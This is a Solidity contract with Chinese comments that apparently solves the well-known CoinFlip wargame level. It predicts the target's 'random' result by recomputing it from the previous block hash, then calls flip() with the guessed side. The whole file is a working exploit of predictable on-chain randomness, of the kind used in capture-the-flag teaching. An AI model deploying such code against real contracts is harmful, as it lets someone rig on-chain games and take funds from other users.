pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Guess {
    CoinFlip private flip;

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _flip) {
        // 部署合约时绑定CoinFlip合约
        flip = CoinFlip(_flip);
    }
    
    function run() external {
        
        // 完全模仿flip函数，算一遍预期的正反面结果
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // 使用执行的结果调用flip
        bool guessSuccess = flip.flip(side);
        require(guessSuccess, "guess failed");
    }
}